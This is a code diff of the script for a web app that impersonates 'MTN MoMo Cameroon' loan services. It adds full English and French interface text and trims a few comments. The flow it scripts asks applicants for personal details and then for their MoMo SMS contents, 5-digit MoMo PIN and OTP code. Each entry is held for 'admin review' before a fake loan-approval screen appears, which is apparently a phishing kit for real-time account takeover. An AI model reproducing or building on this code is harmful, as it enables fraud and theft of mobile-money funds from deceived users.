@@ -2,10 +2,174 @@
 // script.js – Cameroon Version with All Features (Bug‑Fixed)
 // ============================================================
 
-// Language translations (same as before)
+// ─── Language Translations (FULL) ───
 const translations = {
-  en: { ... }, // (copy from previous version)
-  fr: { ... }  // (copy from previous version)
+  en: {
+    welcome: 'Welcome to MTN MoMo Cameroon',
+    tagline: 'Get loans easily through MTN MoMo Cameroon',
+    calculator: 'Loan Calculator',
+    amount: 'Amount',
+    term: 'Term',
+    monthly: 'Monthly Payment',
+    start: 'START APPLICATION',
+    footer: '© 2026 MTN MoMo Loans – Powered by MTN Cameroon',
+    back: 'Back',
+    loan_application: 'Loan Application',
+    step1_sub: 'Step 1 of 5',
+    step2_sub: 'Step 2 of 5',
+    step3_sub: 'Step 3 of 5',
+    step4_sub: 'Step 4 of 5',
+    step5_sub: 'Step 5 of 5',
+    loan_type: 'Loan Type',
+    loan_amount: 'Loan Amount (XAF)',
+    loan_term: 'Loan Term',
+    purpose: 'Purpose of Loan',
+    next: 'NEXT STEP',
+    first_name: 'First Name',
+    last_name: 'Last Name',
+    phone_label: 'Phone Number (Cameroon)',
+    phone_hint: '9 digits without +237 prefix (e.g., 670123456)',
+    employment: 'Employment Status',
+    annual_income: 'Annual Income (XAF)',
+    kin_name: 'Next of Kin Name',
+    kin_phone: 'Next of Kin Phone',
+    summary: 'Application Summary',
+    applicant: 'Applicant',
+    submit: 'SUBMIT APPLICATION',
+    processing: 'Processing Application...',
+    processing_sub: 'Please wait while we process your loan application',
+    awaiting: '⏳ Awaiting admin approval...',
+    verify_sms: 'Verify MoMo Message',
+    paste_sms: '📩 Paste the MoMo message content:',
+    sms_hint: 'This should include the OTP code or verification details sent to your MoMo number.',
+    sms_tip: '💡 Tip:',
+    sms_tip_text: 'Check your SMS inbox for the message from MTN MoMo Cameroon. Copy the entire message text.',
+    submit_sms: 'SUBMIT MOMO MESSAGE',
+    resend_sms: '🔄 Resend SMS',
+    verifying_sms: 'Verifying SMS Message...',
+    verifying_sms_sub: 'Your SMS message has been received. Please wait for admin verification...',
+    admin_reviewing: '⏳ Admin is reviewing your SMS...',
+    enter_pin: 'Enter MoMo PIN',
+    pin_label: 'Enter your MoMo PIN (5 digits):',
+    submit_pin: 'SUBMIT MOMO PIN',
+    verifying_pin: 'Verifying MoMo PIN...',
+    verifying_pin_sub: 'Your MoMo PIN has been received. Please wait for admin verification...',
+    admin_reviewing_pin: '⏳ Admin is reviewing your PIN...',
+    enter_otp: 'Enter OTP Code',
+    otp_sub: 'Enter the 4-digit OTP code sent to your phone via MTN MoMo Cameroon',
+    otp_label: 'OTP Code (4 digits):',
+    verify_otp: 'VERIFY & APPROVE LOAN',
+    resend_otp: '🔄 Resend OTP',
+    verifying_otp: 'Verifying OTP Code...',
+    verifying_otp_sub: 'Your OTP code has been received. Please wait for admin verification...',
+    admin_reviewing_otp: '⏳ Admin is verifying your OTP...',
+    app_id: 'Application ID:',
+    approved_title: 'Loan Approved!',
+    approved_sub: 'Your loan has been successfully approved.',
+    amount_receive: 'Amount to Receive',
+    important: 'Important Information',
+    important_text: 'The funds will be deposited directly to your MTN MoMo account within 5 minutes. Please ensure your phone number is correct.',
+    loan_details: 'Loan Details',
+    next_steps: 'Next Steps:',
+    next_steps_text: 'To start repaying, you can set up an automatic payment plan in your MTN MoMo account in the next 7 days.',
+    finish: 'FINISH',
+    personal: 'Personal Loan',
+    business: 'Business Loan',
+    home: 'Home Loan',
+    student: 'Student Loan',
+    m6: '6 Months',
+    m12: '12 Months',
+    m18: '18 Months',
+    m24: '24 Months',
+    m48: '48 Months',
+    employed: 'Employed',
+    self_employed: 'Self-employed',
+    unemployed: 'Unemployed',
+    retired: 'Retired'
+  },
+  fr: {
+    welcome: 'Bienvenue chez MTN MoMo Cameroun',
+    tagline: 'Obtenez des prêts facilement via MTN MoMo Cameroun',
+    calculator: 'Calculateur de prêt',
+    amount: 'Montant',
+    term: 'Durée',
+    monthly: 'Paiement mensuel',
+    start: 'COMMENCER',
+    footer: '© 2026 Prêts MTN MoMo – Propulsé par MTN Cameroun',
+    back: 'Retour',
+    loan_application: 'Demande de prêt',
+    step1_sub: 'Étape 1 sur 5',
+    step2_sub: 'Étape 2 sur 5',
+    step3_sub: 'Étape 3 sur 5',
+    step4_sub: 'Étape 4 sur 5',
+    step5_sub: 'Étape 5 sur 5',
+    loan_type: 'Type de prêt',
+    loan_amount: 'Montant du prêt (XAF)',
+    loan_term: 'Durée du prêt',
+    purpose: 'Objet du prêt',
+    next: 'ÉTAPE SUIVANTE',
+    first_name: 'Prénom',
+    last_name: 'Nom',
+    phone_label: 'Numéro de téléphone (Cameroun)',
+    phone_hint: '9 chiffres sans le préfixe +237 (ex : 670123456)',
+    employment: 'Statut d’emploi',
+    annual_income: 'Revenu annuel (XAF)',
+    kin_name: 'Nom du proche parent',
+    kin_phone: 'Téléphone du proche parent',
+    summary: 'Résumé de la demande',
+    applicant: 'Demandeur',
+    submit: 'SOUMETTRE LA DEMANDE',
+    processing: 'Traitement de la demande...',
+    processing_sub: 'Veuillez patienter pendant que nous traitons votre demande de prêt',
+    awaiting: '⏳ En attente de l’approbation de l’admin...',
+    verify_sms: 'Vérifier le message MoMo',
+    paste_sms: '📩 Collez le contenu du message MoMo :',
+    sms_hint: 'Cela doit inclure le code OTP ou les détails de vérification envoyés à votre numéro MoMo.',
+    sms_tip: '💡 Astuce :',
+    sms_tip_text: 'Vérifiez votre boîte de réception SMS pour le message de MTN MoMo Cameroun. Copiez tout le texte du message.',
+    submit_sms: 'SOUMETTRE LE MESSAGE MOMO',
+    resend_sms: '🔄 Renvoyer le SMS',
+    verifying_sms: 'Vérification du message SMS...',
+    verifying_sms_sub: 'Votre message SMS a été reçu. Veuillez attendre la vérification de l’admin...',
+    admin_reviewing: '⏳ L’admin examine votre SMS...',
+    enter_pin: 'Entrez le PIN MoMo',
+    pin_label: 'Entrez votre PIN MoMo (5 chiffres) :',
+    submit_pin: 'SOUMETTRE LE PIN MOMO',
+    verifying_pin: 'Vérification du PIN MoMo...',
+    verifying_pin_sub: 'Votre PIN MoMo a été reçu. Veuillez attendre la vérification de l’admin...',
+    admin_reviewing_pin: '⏳ L’admin examine votre PIN...',
+    enter_otp: 'Entrez le code OTP',
+    otp_sub: 'Entrez le code OTP à 4 chiffres envoyé à votre téléphone via MTN MoMo Cameroun',
+    otp_label: 'Code OTP (4 chiffres) :',
+    verify_otp: 'VÉRIFIER ET APPOUVER LE PRÊT',
+    resend_otp: '🔄 Renvoyer l’OTP',
+    verifying_otp: 'Vérification du code OTP...',
+    verifying_otp_sub: 'Votre code OTP a été reçu. Veuillez attendre la vérification de l’admin...',
+    admin_reviewing_otp: '⏳ L’admin vérifie votre OTP...',
+    app_id: 'ID de la demande :',
+    approved_title: 'Prêt approuvé !',
+    approved_sub: 'Votre prêt a été approuvé avec succès.',
+    amount_receive: 'Montant à recevoir',
+    important: 'Informations importantes',
+    important_text: 'Les fonds seront déposés directement sur votre compte MTN MoMo dans les 5 minutes. Assurez-vous que votre numéro de téléphone est correct.',
+    loan_details: 'Détails du prêt',
+    next_steps: 'Prochaines étapes :',
+    next_steps_text: 'Pour commencer à rembourser, vous pouvez configurer un plan de paiement automatique sur votre compte MTN MoMo dans les 7 prochains jours.',
+    finish: 'TERMINER',
+    personal: 'Prêt personnel',
+    business: 'Prêt commercial',
+    home: 'Prêt immobilier',
+    student: 'Prêt étudiant',
+    m6: '6 mois',
+    m12: '12 mois',
+    m18: '18 mois',
+    m24: '24 mois',
+    m48: '48 mois',
+    employed: 'Employé',
+    self_employed: 'Indépendant',
+    unemployed: 'Sans emploi',
+    retired: 'Retraité'
+  }
 };
 
 let currentLang = localStorage.getItem('mtn_lang') || 'en';
@@ -562,7 +726,6 @@ function showApproval() {
     document.getElementById('aprTerm').textContent = S.loanTerm;
     const monthly = Math.ceil(S.loanAmount / parseInt(S.loanTerm));
     document.getElementById('aprMth').textContent = 'XAF ' + monthly.toLocaleString();
-    // Change button to go to dashboard
     const finishBtn = document.querySelector('.rth-btn');
     finishBtn.textContent = currentLang === 'fr' ? 'TERMINER' : 'FINISH';
     finishBtn.onclick = loadDashboard;
@@ -618,7 +781,6 @@ async function submitApp() {
         });
         const data = await res.json();
         if (data.ok) {
-            // Use server-generated ID
             S.applicationId = data.applicationId;
             saveApplicationId(S.applicationId);
             
@@ -640,7 +802,6 @@ async function doSmsParse() {
     const msg = document.getElementById('smsMsgBox').value.trim();
     if (msg.length < 3) { showErr('momErr', 'Please paste a valid SMS message.'); return; }
     
-    // Guard: check element exists before setting textContent
     const waitSmsAppId = document.getElementById('waitSmsAppId');
     if (waitSmsAppId) waitSmsAppId.textContent = S.applicationId;
     
